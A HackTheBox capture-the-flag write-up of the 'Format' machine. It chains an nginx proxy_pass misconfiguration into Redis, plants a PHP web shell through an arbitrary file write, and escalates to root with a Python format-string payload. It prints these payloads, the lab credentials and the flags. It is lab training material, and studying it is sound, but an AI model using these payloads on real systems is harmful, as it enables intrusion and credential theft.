<h3> Format HackTheBox </h3>

Difficulty = Medium

Nmap Scan:
![[Pasted image 20230605094519.png]]

I added the domain `microblog.htb` to my `/etc/hosts` file

Checking port 80 redirects to the `app` subdomain

I also appended that to my `/etc/hosts` file

Now checking it back shows this
![[Pasted image 20230605094731.png]]

Seems to be like a blog where we can make subdomains

I registered and checked it
![[Pasted image 20230605094901.png]]

The footer shows this:
```
Wanna go pro and upload images for only $5 a month? **Apply here!**
```

But when I clicked the link it showed me:
```
Sorry pro licensing is being developed
```

Let us check out port *3000* which runs *gitea*
![[Pasted image 20230605095052.png]]

We don't have any credential but we can try to explore repository
![[Pasted image 20230605095129.png]]

That seems to be the source code for the web app on port 80

And it is indeed it
![[Pasted image 20230605095157.png]]

Looking at *edit/index.php* shows this
![[Pasted image 20230605095339.png]]

```php
<?php
$username = session_name("username");
session_set_cookie_params(0, '/', '.microblog.htb');
session_start();
if(file_exists("bulletproof.php")) {
    require_once "bulletproof.php";
}

if(is_null($_SESSION['username'])) {
    header("Location: /");
    exit;
}

function checkUserOwnsBlog() {
    $redis = new Redis();
    $redis->connect('/var/run/redis/redis.sock');
    $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
    $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
    if(!in_array($subdomain, $userSites)) {
        header("Location: /");
        exit;
    }
}

function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}

//always check user owns blog before proceeding with any actions
checkUserOwnsBlog();

//provision pro environment for new pro users
provisionProUser();

//delete section
if(isset($_POST['action']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $contents = file_get_contents("order.txt");
    $contents = str_replace($_POST['id'] . "\n", '', $contents);
    file_put_contents("order.txt", $contents);

    //delete image file if content is image
    $data = file_get_contents($_POST['id']);
    $img_check = substr($data, 0, 26);
    if($img_check === "<div class = \"blog-image\">") {
        $startsAt = strpos($data, "<img src = \"/uploads/") + strlen("<img src = \"/uploads/");
        $endsAt = strpos($data, "\" /></div>", $startsAt);
        $fileToDelete = substr($data, $startsAt, $endsAt - $startsAt);
        chdir(getcwd() . "/../uploads");
        $file_pointer = $fileToDelete;
        unlink($file_pointer);
        chdir(getcwd() . "/../content");
    }
    $file_pointer = $_POST['id'];
    unlink($file_pointer);
    return "Section deleted successfully";
}

//add header
if (isset($_POST['header']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

//add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

//add image
if (isset($_FILES['image']) && isset($_POST['id'])) {
    if(isPro() === "false") {
        print_r("Pro subscription required to upload images");
        header("Location: /edit?message=Pro subscription required&status=fail");
        exit();
    }
    $image = new Bulletproof\Image($_FILES);
    $image->setLocation(getcwd() . "/../uploads");
    $image->setSize(100, 3000000);
    $image->setMime(array('png'));

    if($image["image"]) {
        $upload = $image->upload();

        if($upload) {
            $upload_path = "/uploads/" . $upload->getName() . ".png";
            $html = "<div class = \"blog-image\"><img src = \"{$upload_path}\" /></div>";
            chdir(getcwd() . "/../content");
            $post_file = fopen("{$_POST['id']}", "w");
            fwrite($post_file, $html);
            fclose($post_file);
            $order_file = fopen("order.txt", "a");
            fwrite($order_file, $_POST['id'] . "\n");  
            fclose($order_file);
            header("Location: /edit?message=Image uploaded successfully&status=success");
        }
        else {
            header("Location: /edit?message=Image upload failed&status=fail");
        }
    }
}

function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}

function getBlogName() {
    return '"' . array_shift((explode('.', $_SERVER['HTTP_HOST']))) . '"';
}

function getFirstName() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $firstName = $redis->HGET($_SESSION['username'], "first-name");
        return "\"" . ucfirst(strval($firstName)) . "\"";
    }
}

function fetchPage() {
    chdir(getcwd() . "/../content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line} blog-indiv-content\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}

?>
```

Quite a lot is going on there but let us know what it does:

```
Check the code and find that edit/index.php obtains the file name from the id parameter and writes the content provided by the txt parameter. It seems that you can write files arbitrarily, and then append the content of the id parameter, that is, the file name, into order.txt
```

Let us confirm it
![[Pasted image 20230605100938.png]]

Now I'll add `pwner.microblog.htb` to my `/etc/hosts`
![[Pasted image 20230605101135.png]]
![[Pasted image 20230605101228.png]]

The web server is built on `nginx` 
![[Pasted image 20230605101304.png]]

Let us read the configuration file which is at `/etc/nginx/sites-enabled/default`
![[Pasted image 20230605101352.png]]

```config
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

server { 
    listen 80 default_server;
    listen [::]:80 default_server;

    # SSL configuration 
    #
    # listen 443 ssl default_server;
    # listen [::]:443 ssl default_server;
    # Note: You should disable gzip for SSL traffic. 
    # See: https://bugs.debian.org/773332 
    # 
    # Read up on ssl_ciphers to ensure a secure configuration. 
    # See: https://bugs.debian.org/765782 
    # 
    # Self signed certs generated by the ssl-cert package 
    # Don't use them in a production server! 
    # 
    # include snippets/snakeoil.conf;
    
    root /var/www/html;
    # Add index.php to the list if you are using PHP 
    index index.html index.htm index.nginx-debian.html;
     
    server_name _; 
    
    location / { 
        # First attempt to serve request as file, then 
        # as directory, then fall back to displaying a 404. 
        try_files $uri $uri/ =404; 
        } 
        
    # pass PHP scripts to FastCGI server 
    # 
    #location ~ \.php$ { 
        #       include snippets/fastcgi-php.conf;
        #       # With php-fpm (or other unix sockets):
        #       fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        #}


       # deny access to .htaccess files, if Apache's document root 
       # concurs with nginx's one 
       #
       #location ~ /\.ht { 
       #    deny all; 
       #}
}

server { 
    listen 80;
    listen [::]:80; 
    root /var/www/microblog/app; 
    index index.html index.htm index-nginx-debian.html;

    server_name microblog.htb; 

    location / { 
        return 404;
    } 
    
    location = /static/css/health/ { 
        resolver 127.0.0.1; 
        proxy_pass http://css.microbucket.htb/health.txt; 
    } 
    
    location = /static/js/health/ { 
        resolver 127.0.0.1;
         proxy_pass http://js.microbucket.htb/health.txt;
    } 
    
    location ~ /static/(.*)/(.*) { 
        resolver 127.0.0.1; 
        proxy_pass http://$1.microbucket.htb/$2;
    }
}
```

At first this took me time but then after research I found that there can be misconfiguration in [nginx](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/)

In our case the misconfiguration is:
![[Pasted image 20230605103151.png]]
```
    location ~ /static/(.*)/(.*) { 
        resolver 127.0.0.1; 
        proxy_pass http://$1.microbucket.htb/$2;
```

From the blog we can chain it with redis and this is good cause from the `edit/index.php` the `provisionProUser()` function connects to redis then checks if the `user` is a `pro user`  

Here's the command I used to set my user to pro
![[Pasted image 20230605103945.png]]
```bash
curl -X HSET "http://microblog.htb/static/unix:/var/run/redis/redis.sock:pwner pro true a/b"
```

On refreshing the `app` subdomain we can see we are now a pro user
![[Pasted image 20230605104052.png]]

Back to the source we also have arbitrary file write
```php
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}
```

Let's now take advantage of it
![[Pasted image 20230605104621.png]]
```
id=/var/www/microblog/pwner/uploads/pwned.php&txt=<%3fphp+system($_GET['cmd'])%3b+%3f>
```

We can now run commands
![[Pasted image 20230605104718.png]]

Lets now get a reverse shell
![[Pasted image 20230605104907.png]]

When I checked internal port I got this
![[Pasted image 20230605105233.png]]

But it's weird why the redis port isn't open

And we know the web app connected to redis using `/var/run/redis/redis.sock` 

So basically we can also connect to it using the `socket option -s` from `redis-cli`
![[Pasted image 20230605105421.png]]

It worked!

Moving over to [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) shows on how to enumerate redis
![[Pasted image 20230605105923.png]]
```
INFO keyspace
SELECT 0
KEYS *
HGETALL cooper.dooper
```

We get the user `cooper` password to be `zooperdoopercooper`

Login in to ssh with `cooper:zooperdoopercooper` works
![[Pasted image 20230605110047.png]]

Let us escalate to root

Checking for sudo permission shows that we can run `/usr/bin/license` as root
![[Pasted image 20230605110202.png]]

Running it shows that it seems to be getting the user based on the web app
![[Pasted image 20230605110333.png]]

We also have read access over the script

```python
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")

```

What the code does is to create license key for a user

But the issue with the program lays here:

```python
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

Since we know it's first going to make a connection to the redis to get a username

```python
r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')
```

Then use python formatting to get the username and last name

```python
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

We now have a `Python Format String Vulnerability` since the formatting is going to be done over an input we control which is the `firstname` 

Here's the [resource](https://podalirius.net/en/articles/python-format-string-vulnerabilities/)

I created a new user from the redis
![[Pasted image 20230605113052.png]]
```r
HMSET pwned first-name "{license.__init__.__globals__}" last-name pwned username pwned
```


Now we can run the script as sudo and specify the username to be `pwned`
![[Pasted image 20230605113145.png]]

Looking at the result i saw this string `unCR4ckaBL3Pa$$w0rd`
![[Pasted image 20230605113315.png]]

Trying it as the root password works
![[Pasted image 20230605113400.png]]

```
User: 200e0ec7c40cffad136ed8671322c13a
Root: 6c41584ba0c44fdb0f9b20633d16db7c
```

What I have learnt:
- Source code analysis
- File Inclusion
- Misconfiguration in nginx
- Arbitrary file write
- Enumerating redis
- Python format string vulnerability

